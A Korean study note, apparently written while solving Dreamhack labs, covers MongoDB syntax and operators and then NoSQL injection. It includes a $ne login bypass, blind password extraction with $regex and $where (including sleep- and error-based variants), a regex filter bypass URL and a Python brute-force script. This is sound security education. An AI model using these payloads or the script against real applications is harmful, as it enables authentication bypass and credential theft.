
# 1. MongoDB 란?

MongoDB는 JSON 형태인 도큐먼트(Document)를 저장하며, 다음과 같은 특징을 갖고 있습니다.

1. 스키마를 따로 정의하지 않아 각 **컬렉션(Collection)** 에 대한 정의가 필요하지 않습니다.
    
2. JSON 형식으로 쿼리를 작성할 수 있습니다.
    
3. _id 필드가 Primary Key 역할을 합니다.


각 DBMS에서 `status`의 값이 "A"이고, `qty`의 값이 30보다 작은 데이터를 조회하는 쿼리는 다음과 같습니다. MongoDB의 경우 `$` 문자를 통해 연산자를 사용할 수 있습니다. 

|**DBMS**|**Query**|
|---|---|
|RDBMS|```SELECT * FROM inventory WHERE status = "A" and qty < 30;```|
|MongoDB|```db.inventory.find( { $and: [ { status: "A" }, { qty: { $lt: 30 } } ] } )```|

|**컬렉션(Collection)**|
|---|
|컬렉션은 데이터베이스의 하위에 속하는 개념으로, RDBMS의 테이블과 비슷합니다.|

# 2. MongoDB 사용 예시

```
$ mongosh
> db.user.insertOne({uid: 'admin', upw: 'secretpassword'}){ acknowledged: true, insertedId: ObjectId("5e71d395b050a2511caa827d")}
> db.user.find({uid: 'admin'})[{ "_id" : ObjectId("5e71d395b050a2511caa827d"), "uid" : "admin", "upw" : "secretpassword" }]
```


# 3. MongoDB 연산자


## Comparison

|Name|Description|
|---|---|
|`$eq`|지정된 값과 같은 값을 찾습니다. **(equal)**|
|`$in`|배열 안의 값들과 일치하는 값을 찾습니다. **(in)**|
|`$ne`|지정된 값과 같지 않은 값을 찾습니다. **(not equal)**|
|`$nin`|배열 안의 값들과 일치하지 않는 값을 찾습니다. **(not in)**|

## Logical

|Name|Description|
|---|---|
|`$and`|논리적 AND, 각각의 쿼리를 모두 만족하는 문서가 반환됩니다.|
|`$not`|쿼리 식의 효과를 반전시킵니다. 쿼리 식과 일치하지 않는 문서를 반환합니다.|
|`$nor`|논리적 NOR, 각각의 쿼리를 모두 만족하지 않는 문서가 반환됩니다.|
|`$or`|논리적 OR, 각각의 쿼리 중 하나 이상 만족하는 문서가 반환됩니다.|

## Element

|Name|Description|
|---|---|
|`$exists`|지정된 필드가 있는 문서를 찾습니다.|
|`$type`|지정된 필드가 지정된 유형인 문서를 선택합니다.|

## Evaluation

|Name|Description|
|---|---|
|`$expr`|쿼리 언어 내에서 집계 식을 사용할 수 있습니다.|
|`$regex`|지정된 정규식과 일치하는 문서를 선택합니다.|
|`$text`|지정된 텍스트를 검색합니다.|


# 4. 기본 문법 

## SELECT 

|**SQL**|**MongoDB**|
|---|---|
|SELECT * FROM account;| db.account.find() |
|SELECT * FROM account WHERE user_id="admin";|db.account.find({user_id: "admin"}) |
| SELECT user_idx FROM account WHERE user_id="admin";|db.account.find({ user_id: "admin" },{ user_idx:1, _id:0 })|


## INSERT 

|**SQL**|**MongoDB**|
|---|---|
|INSERT INTO account(<br> user_id,<br> user_pw<br>) VALUES (<br>"guest", <br>"guest"<br>);|db.account.insertOne({<br>user_id: "guest",<br>user_pw: "guest"})|


## DELETE 

|**SQL**|**MongoDB**|
|---|---|
|DELETE FROM account;|db.account.remove()|
|DELETE FROM account WHERE user_id="guest";|db.account.remove( {user_id: "guest"} )|


## UPDATE

|**SQL**|**MongoDB**|
|---|---|
|UPDATE account SET user_id="guest2" WHERE user_idx=2;|db.account.updateOne({user_idx: 2},{ $set: { user_id: "guest2" } })|




# 5. NoSQL Injection 

|**MongoDB 타입 공식 문서**|
|---|
|- [https://docs.mongodb.com/manual/reference/operator/query/type/](https://docs.mongodb.com/manual/reference/operator/query/type/)|

## 1. Url 에 따른 예제 결과 

|**Figure 1. express 데이터 처리 방식**|
|---|
|const express = require('express');<br>const app = express();<br>app.get('/', function(req,res) { <br>&nbsp;console.log('data:', req.query.data);<br>  &nbsp;console.log('type:', typeof req.query.data);<br>  &nbsp;res.send('hello world');<br>});<br>const server = app.listen(3000, function(){<br>  &nbsp;console.log('app.listen');<br>});|

###  Figure 2. 실행결과

```
http://localhost:3000/?data=1234
data: 1234
type: string

http://localhost:3000/?data[]=1234
data: [ '1234' ]
type: object

http://localhost:3000/?data[]=1234&data[]=5678
data: [ '1234', '5678' ] 
type: object

http://localhost:3000/?data[5678]=1234
data: { '5678': '1234' }
type: object

http://localhost:3000/?data[5678]=1234&data=0000
data: { '5678': '1234', '0000': true } 
type: object

http://localhost:3000/?data[5678]=1234&data[]=0000
data: { '0': '0000', '5678': '1234' } 
type: object

http://localhost:3000/?data[5678]=1234&data[1111]=0000
data: { '1111': '0000', '5678': '1234' } 
type: object
```

## 2. 예제  NoSQLI

**Figure 4**는 `$ne` 연산자를 사용해 `uid`와 `upw`가 "a"가 아닌 데이터를 조회하는 공격 쿼리와 실행 결과입니다.

|**Figure 4. 연산자를 사용해 계정 정보를 알아낸 모습**|
|---|
|http://localhost:3000/query?uid[$ne]=a&upw[$ne]=a <br> => <br> [{"_id":"5ebb81732b75911dbcad8a19","uid":"admin","upw":"secretpassword"}]|


## 3. Blind NoSQLI 

MongoDB에서는 `$regex`, `$where` 연산자를 사용해 Blind NoSQL Injection을 할 수 있습니다.

|**MongoDB 연산자 공식 문서**|
|---|
|- [https://docs.mongodb.com/manual/reference/operator/query/](https://docs.mongodb.com/manual/reference/operator/query/)|

### Blind NoSQLI 사용함수

|Name|Description|
|---|---|
|`$expr`|쿼리 언어 내에서 집계 식을 사용할 수 있습니다.|
|`$regex`|지정된 정규식과 일치하는 문서를 선택합니다.|
|`$text`|지정된 텍스트를 검색합니다.|
|`$where`|JavaScript 표현식을 만족하는 문서와 일치합니다.|

### $regex

정규식을 사용해 식과 일치하는 데이터를 조회합니다. **Figure6**는 `upw`에서 각 문자로 시작하는 데이터를 조회하는 쿼리의 예시입니다.


**Figure 6. regex 연산자를 활용한 Blind NoSQL Injection**
```
> db.user.find({upw: {$regex: "^a"}})
> db.user.find({upw: {$regex: "^b"}})
> db.user.find({upw: {$regex: "^c"}})
...
> db.user.find({upw: {$regex: "^g"}})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", 
"upw" : "guest"}
```

**길이 획득**
```
{"uid": "admin", "upw": {"$regex":".{5}"}}
=> admin

{"uid": "admin", "upw": {"$regex":".{6}"}}
=> undefined
```

**글자 획득**
```
{"uid": "admin", "upw": {"$regex":"^a"}}
admin

{"uid": "admin", "upw": {"$regex":"^aa"}}
undefined

{"uid": "admin", "upw": {"$regex":"^ab"}}
undefined

{"uid": "admin", "upw": {"$regex":"^ap"}}
admin

...

{"uid": "admin", "upw": {"$regex":"^apple$"}} -> $ 마지막 글자인지 확인 하는듯
```

### $where 

**표현식** 
인자로 전달한 Javascript 표현식을 만족하는 데이터를 조회합니다. **Figure 7**을 살펴보면, 해당 연산자는 field에서 사용할 수 없는 것을 확인할 수 있습니다.

**Figure 7. where 연산자와 표현식**
```
> db.user.find({$where:"return 1==1"})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", 
"upw" : "guest" }

> db.user.find({uid:{$where:"return 1==1"}})
error: { 
  "$err" : "Can't canonicalize query: BadValue $where cannot be applied to a field", 
  "code" : 17287
}
```


**substring**
해당 연산자로 Javascript 표현식을 입력하면, Blind SQL Injection에서 한 글자씩 비교했던 것과 같이 데이터를 알아낼 수 있습니다. **Figure 8**은 `upw`의 첫 글자를 비교해 데이터를 알아내는 쿼리입니다.

**Figure 8. where 연산자와 substring**
```
> db.user.find({$where: "this.upw.substring(0,1)=='a'"})
> db.user.find({$where: "this.upw.substring(0,1)=='b'"})
> db.user.find({$where: "this.upw.substring(0,1)=='c'"})
...
> db.user.find({$where: "this.upw.substring(0,1)=='g'"})
{ "_id" : ObjectId("5ea0110b85d34e079adb3d19"), "uid" : "guest", "upw" : "guest" }
```



**Sleep 함수를 통한 Time based Injection**
MongoDB는 `sleep` 함수를 제공합니다. 표현식과 함께 사용하면 지연 시간을 통해 참/거짓 결과를 확인할 수 있습니다. **Figure 9**은 `upw`의 첫 글자를 비교하고, 해당 표현식이 참을 반환할 때 `sleep` 함수를 실행하는 쿼리입니다.

**Figure 9. Sleep 함수를 통한 Time based Injection**
```
db.user.find({$where:
`this.uid=='${req.query.uid}'&&this.upw=='${req.query.upw}'`});
/*
/?uid=guest'&&this.upw.substring(0,1)=='a'&&sleep(5000)&&'1
/?uid=guest'&&this.upw.substring(0,1)=='b'&&sleep(5000)&&'1
/?uid=guest'&&this.upw.substring(0,1)=='c'&&sleep(5000)&&'1
...
/?uid=guest'&&this.upw.substring(0,1)=='g'&&sleep(5000)&&'1
=> 시간 지연 발생.
*/
```



**Error based Injection**
Errror based Injection은 에러를 기반으로 데이터를 알아내는 기법으로, 올바르지 않은 문법을 입력해 고의로 에러를 발생시킵니다. **Figure 10**를 살펴보면, `upw`의 첫 글자가 'g' 문자인 경우 올바르지 않은 문법인 `asdf`를 실행하면서 에러가 발생합니다.

**Figure 10. Error based Injection**
```
> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='g'&&asdf&&'1'&&this.upw=='${upw}'"});
error: {
"$err" : "ReferenceError: asdf is not defined near '&&this.upw=='${upw}'' ",
"code" : 16722
}
// this.upw.substring(0,1)=='g' 값이 참이기 때문에 asdf 코드를 실행하다 에러 발생

> db.user.find({$where: "this.uid=='guest'&&this.upw.substring(0,1)=='a'&&asdf&&'1'&&this.upw=='${upw}'"});
// this.upw.substring(0,1)=='a' 값이 거짓이기 때문에 뒤에 코드가 작동하지 않음
```



### Exploit

**filter bypass**
filter함수가 특정 문자열을 필터링하고있지만, 정규표현식에서 임의 문자를 의미하는 `.`을 이용하여 쉽게 우회할 수 있습니다.
$regex -> 지정된 정규식과 일치하는 문서를 찾는 함수

```
http://host1.dreamhack.games:13698/login?uid[$regex]=ad.in&upw[$regex]=D.{*
```


**Exploit Code**
```
import requests, string

HOST = 'http://localhost'
ALPHANUMERIC = string.digits + string.ascii_letters # 숫자+문자(대소문자)
SUCCESS = 'admin'

flag = ''
for i in range(32): 
	for ch in ALPHANUMERIC: 
		response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}') 
		if response.text == SUCCESS: 
			flag += ch 
			break 			
	print(f'FLAG: DH{{{flag}}}')

```

vscode에서 python 사용 시  설치 extensions
python 
autopep8(라인정리 ? 용도)
requests module 없을 경우  -> pip3 install requests 
https://stackoverflow.com/questions/68832892/why-cant-i-import-requests-in-vs-code

